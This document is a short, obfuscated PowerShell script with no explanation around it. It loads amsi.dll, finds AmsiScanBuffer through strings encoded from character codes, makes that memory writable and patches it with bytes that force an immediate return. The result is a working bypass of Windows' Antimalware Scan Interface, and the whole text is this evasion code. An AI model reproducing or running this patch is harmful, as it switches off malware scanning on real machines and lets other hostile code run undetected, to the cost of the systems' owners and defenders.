$g43FxXgM5WTvg = @"
using System;
using System.Runtime.InteropServices;
public class g43FxXgM5WTvg {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Lx5cR3Kzzxn, string lemkkwi6Q8DWU);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr ag5wYW4RIxFyY, UIntPtr f_2d, uint fes49DlQdW2OU, out uint Ju28ZfLrWKXspU1ynlB_);
}
"@

Add-Type $g43FxXgM5WTvg

$oGJHl51gBpTPHpbBt = [g43FxXgM5WTvg]::LoadLibrary("$([chaR]([byte]0x61)+[cHaR]([bYTe]0x6d)+[cHAR](83+32)+[CHar](105)+[ChaR](46*14/14)+[char](47+53)+[Char]([bYTe]0x6c)+[CHaR]([bYte]0x6c))")
$zy__ = [g43FxXgM5WTvg]::GetProcAddress($oGJHl51gBpTPHpbBt, "$(('Ãms'+'íSc'+'ânB'+'ùff'+'èr').norMAlize([ChAR]([bYte]0x46)+[cHaR]([BYTE]0x6f)+[CHAR]([byte]0x72)+[chaR](109+51-51)+[cHAR]([bYTe]0x44)) -replace [cHaR]([ByTE]0x5c)+[CHaR]([byte]0x70)+[cHAr]([bytE]0x7b)+[ChAR](77*66/66)+[chaR](110+78-78)+[CHAr]([ByTE]0x7d))")
$p = 0
[g43FxXgM5WTvg]::VirtualProtect($zy__, [uint32]5, 0x40, [ref]$p)
$uM2aOhlOIBadJUtxY_Fz = "0xB8"
$_KJ9U = "0x57"
$EeAMWKQjxGLKmgfHp = "0x00"
$CkJ7RkI4TJBY = "0x07"
$A6QM365 = "0x80"
$lESpwVRsYUmCqZfeHC = "0xC3"
$sZL49e20dW9s6 = [Byte[]] ($uM2aOhlOIBadJUtxY_Fz,$_KJ9U,$EeAMWKQjxGLKmgfHp,$CkJ7RkI4TJBY,+$A6QM365,+$lESpwVRsYUmCqZfeHC)
[System.Runtime.InteropServices.Marshal]::Copy($sZL49e20dW9s6, 0, $zy__, 6)